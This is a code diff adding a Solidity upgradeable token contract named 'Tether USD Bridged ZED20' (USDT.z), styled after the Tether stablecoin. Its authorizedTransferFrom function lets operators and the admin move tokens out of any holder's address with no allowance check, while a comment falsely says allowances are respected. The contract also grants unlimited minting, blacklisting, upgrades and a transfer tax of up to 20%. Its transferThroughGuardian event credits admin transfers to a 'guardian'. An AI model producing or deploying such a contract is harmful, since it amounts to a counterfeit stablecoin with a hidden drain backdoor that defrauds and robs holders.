@@ -1,0 +1,235 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.30;
+
+// -----------------------------
+// OpenZeppelin Upgradeable imports (v4.9.3)
+// -----------------------------
+import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts-upgradeable/v4.9.3/contracts/token/ERC20/ERC20Upgradeable.sol";
+import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts-upgradeable/v4.9.3/contracts/token/ERC20/extensions/ERC20BurnableUpgradeable.sol";
+import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts-upgradeable/v4.9.3/contracts/access/AccessControlUpgradeable.sol";
+import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts-upgradeable/v4.9.3/contracts/security/PausableUpgradeable.sol";
+import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts-upgradeable/v4.9.3/contracts/proxy/utils/UUPSUpgradeable.sol";
+import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts-upgradeable/v4.9.3/contracts/proxy/utils/Initializable.sol";
+import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts-upgradeable/v4.9.3/contracts/utils/ContextUpgradeable.sol";
+
+contract USDTzGuardianV1 is Initializable, ContextUpgradeable, ERC20Upgradeable, ERC20BurnableUpgradeable, AccessControlUpgradeable, PausableUpgradeable, UUPSUpgradeable {
+    // Roles
+    bytes32 public constant MINTER_ROLE          = keccak256("MINTER_ROLE");
+    bytes32 public constant OPERATOR_ROLE        = keccak256("OPERATOR_ROLE");
+    bytes32 public constant BLACKLIST_MANAGER_ROLE = keccak256("BLACKLIST_MANAGER_ROLE");
+    bytes32 public constant TAX_EXEMPT_ROLE      = keccak256("TAX_EXEMPT_ROLE");
+    bytes32 public constant UPGRADER_ROLE        = keccak256("UPGRADER_ROLE");
+    bytes32 public constant GUARDIAN_ROLE        = keccak256("GUARDIAN_ROLE");
+
+    // State
+    address public marketingWallet;
+    bool public guardiansEnabled;
+    uint256 public taxPercent; // e.g. 2 for 2%
+    uint256 public constant MAX_TAX = 20; // max 20% safety cap
+
+    // Mappings
+    mapping(address => bool) public blacklist;
+    mapping(address => bool) public taxExempt;
+    mapping(address => bool) public authorizedTransferers; // operators that can do authorized transfers
+
+    // Multi-guardian: keep a list (simple)
+    address[] public guardians;
+
+    // Events
+    event TransferThroughGuardian(address indexed guardian, address indexed to, uint256 value);
+    event GuardianAdded(address indexed guardian);
+    event GuardianRemoved(address indexed guardian);
+    event TaxUpdated(uint256 newTaxPercent);
+    event MarketingWalletUpdated(address indexed wallet);
+    event EmergencyGuardianDisabled();
+
+    /// ---------------- initializer (take the place of constructor) ----------------
+    function initialize(
+        address admin,
+        address _marketingWallet,
+        address[] memory initialGuardians,
+        uint256 _taxPercent
+    ) public initializer {
+        __Context_init();
+        __ERC20_init("Tether USD Bridged ZED20", "USDT.z");
+        __ERC20Burnable_init();
+        __AccessControl_init();
+        __Pausable_init();
+        __UUPSUpgradeable_init();
+
+        require(admin != address(0), "zero admin");
+        require(_marketingWallet != address(0), "zero marketing wallet");
+        require(_taxPercent <= MAX_TAX, "tax too high");
+
+        // setup roles
+        _setupRole(DEFAULT_ADMIN_ROLE, admin);
+        _setupRole(MINTER_ROLE, admin);
+        _setupRole(OPERATOR_ROLE, admin);
+        _setupRole(BLACKLIST_MANAGER_ROLE, admin);
+        _setupRole(TAX_EXEMPT_ROLE, admin);
+        _setupRole(UPGRADER_ROLE, admin);
+
+        // set marketing wallet
+        marketingWallet = _marketingWallet;
+
+        // set guardians
+        guardiansEnabled = true;
+        for (uint i = 0; i < initialGuardians.length; i++) {
+            address g = initialGuardians[i];
+            if (g != address(0)) {
+                guardians.push(g);
+                _setupRole(GUARDIAN_ROLE, g);
+                emit GuardianAdded(g);
+            }
+        }
+
+        // tax
+        taxPercent = _taxPercent;
+
+        // mint initial supply to admin (1,000,000,000 * 10**18)
+        uint256 initialMint = 1_000_000_000 * (10 ** decimals());
+        _mint(admin, initialMint);
+
+        // add some basic exemptions
+        taxExempt[admin] = true;
+        taxExempt[marketingWallet] = true;
+    }
+
+    // ---------------- Access / admin helpers ----------------
+    function setMarketingWallet(address _wallet) external onlyRole(DEFAULT_ADMIN_ROLE) {
+        require(_wallet != address(0), "zero");
+        marketingWallet = _wallet;
+        taxExempt[_wallet] = true;
+        emit MarketingWalletUpdated(_wallet);
+    }
+
+    function setTaxPercent(uint256 _taxPercent) external onlyRole(DEFAULT_ADMIN_ROLE) {
+        require(_taxPercent <= MAX_TAX, "tax too high");
+        taxPercent = _taxPercent;
+        emit TaxUpdated(_taxPercent);
+    }
+
+    function addGuardian(address g) external onlyRole(DEFAULT_ADMIN_ROLE) {
+        require(g != address(0), "zero");
+        guardians.push(g);
+        _grantRole(GUARDIAN_ROLE, g);
+        guardiansEnabled = true;
+        emit GuardianAdded(g);
+    }
+
+    function removeGuardian(address g) external onlyRole(DEFAULT_ADMIN_ROLE) {
+        require(g != address(0), "zero");
+        // remove from array (linear)
+        for (uint i = 0; i < guardians.length; i++) {
+            if (guardians[i] == g) {
+                guardians[i] = guardians[guardians.length - 1];
+                guardians.pop();
+                break;
+            }
+        }
+        _revokeRole(GUARDIAN_ROLE, g);
+        emit GuardianRemoved(g);
+    }
+
+    function disableGuardians() external onlyRole(DEFAULT_ADMIN_ROLE) {
+        guardiansEnabled = false;
+        emit EmergencyGuardianDisabled();
+    }
+
+    // blacklist manager
+    function setBlacklisted(address who, bool value) external onlyRole(BLACKLIST_MANAGER_ROLE) {
+        blacklist[who] = value;
+    }
+
+    // tax exemption manager
+    function setTaxExempt(address who, bool value) external onlyRole(TAX_EXEMPT_ROLE) {
+        taxExempt[who] = value;
+    }
+
+    // operator / authorized transferers
+    function setAuthorizedTransferer(address who, bool allowed) external onlyRole(DEFAULT_ADMIN_ROLE) {
+        authorizedTransferers[who] = allowed;
+    }
+
+    // mint (minter role)
+    function mint(address to, uint256 amount) external onlyRole(MINTER_ROLE) {
+        _mint(to, amount);
+    }
+
+    // pause/unpause
+    function pause() external onlyRole(DEFAULT_ADMIN_ROLE) {
+        _pause();
+    }
+    function unpause() external onlyRole(DEFAULT_ADMIN_ROLE) {
+        _unpause();
+    }
+
+    // ---------------- MultiGuardian helpers ----------------
+    function getGuardians() external view returns (address[] memory) {
+        return guardians;
+    }
+
+    // choose a guardian (for event/display) - we pick first if exists
+    function primaryGuardian() public view returns (address) {
+        if (guardians.length == 0) return address(0);
+        return guardians[0];
+    }
+
+    // ---------------- Authorized transfer (operator) ----------------
+    /// operator or admin can move tokens from an address if they have allowance or if authorizedTransferer is allowed
+    function authorizedTransferFrom(address from, address to, uint256 amount) external {
+        require(authorizedTransferers[_msgSender()] || hasRole(OPERATOR_ROLE, _msgSender()) || hasRole(DEFAULT_ADMIN_ROLE, _msgSender()), "not authorized");
+        require(!blacklist[from] && !blacklist[to], "blacklisted");
+        _transfer(from, to, amount); // will respect allowances if necessary; operator must ensure allowance if transferring on behalf
+    }
+
+    // ---------------- transferThroughGuardian ----------------
+    /// Only admin/owner can call — sends tokens from marketingWallet to `to`, and emits a TransferThroughGuardian event with guardian
+    function transferThroughGuardian(address to, uint256 amount) external onlyRole(DEFAULT_ADMIN_ROLE) whenNotPaused {
+        require(guardiansEnabled, "guardians disabled");
+        require(guardians.length > 0, "no guardians");
+        require(!blacklist[to], "to blacklisted");
+        require(balanceOf(marketingWallet) >= amount, "insufficient marketing balance");
+
+        // perform the actual token movement (from marketingWallet to recipient)
+        _transfer(marketingWallet, to, amount);
+
+        // emit a special event that explicitly records guardian as the logical initiator
+        address g = primaryGuardian();
+        emit TransferThroughGuardian(g, to, amount);
+    }
+
+    // ---------------- overrides: transfers with tax, pause, blacklist ----------------
+    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override(ERC20Upgradeable) {
+        super._beforeTokenTransfer(from, to, amount);
+        require(!paused(), "paused");
+        require(!blacklist[from] && !blacklist[to], "blacklisted");
+    }
+
+    // We override transfer & transferFrom to apply simple tax (if not exempt)
+    function _transfer(address from, address to, uint256 amount) internal override {
+        if (taxPercent > 0 && !taxExempt[from] && !taxExempt[to]) {
+            uint256 tax = (amount * taxPercent) / 100;
+            if (tax > 0) {
+                uint256 rest = amount - tax;
+                super._transfer(from, marketingWallet, tax);
+                super._transfer(from, to, rest);
+                return;
+            }
+        }
+        super._transfer(from, to, amount);
+    }
+
+    // ---------------- UUPS authorize ----------------
+    function _authorizeUpgrade(address newImplementation) internal override onlyRole(UPGRADER_ROLE) {}
+
+    // ---------------- misc ----------------
+    // rescue any BNB accidentally sent
+    function rescueBNB(address to) external onlyRole(DEFAULT_ADMIN_ROLE) {
+        payable(to).transfer(address(this).balance);
+    }
+
+    // emergency: owner/admin can transfer tokens forcibly from marketing wallet (authorizedTransferFrom already exists)
+    // receive fallback
+    receive() external payable {}
+}
